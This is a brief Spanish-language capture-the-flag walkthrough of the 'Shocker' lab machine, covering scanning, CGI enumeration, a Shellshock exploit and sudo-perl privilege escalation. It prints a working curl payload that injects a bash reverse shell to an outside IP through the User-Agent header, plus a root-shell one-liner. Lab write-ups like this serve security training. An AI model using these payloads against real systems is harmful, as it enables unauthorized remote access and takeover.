# Shocker
Maquina sencilla centrada en una vulnerabilidad real, la llamada Shellshock

Interesante: Shellshock
## Initial Scan
```
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18  (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
```
## Enum
### HTTP
#### Gobuster
```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/cgi-bin/ (Status: 403)
/server-status (Status: 403)
```
Dentro de cgi-bin usamos otra vez gobuster pero con extensiones de ejecutables esta vez php,c,pl,py,sh y encontramos un .sh
```
/user.sh (Status: 200)
```
## Exploit
Parece que tenemos todos los ingredientes para ejecutar un ataque mediante shellshock apache mod_cgi remote exploit
```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/bash -i >& /dev/tcp/10.10.14.16/8080 0>&1 ' bash -s :'' http://10.10.10.56/cgi-bin/user.sh
```
Con esto ya tenemos shell como shelly
## Privesc
```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
Ejecutamos lo siguiente
```
    sudo perl -e 'exec "/bin/bash";'
```
Y obtenemos shell como root
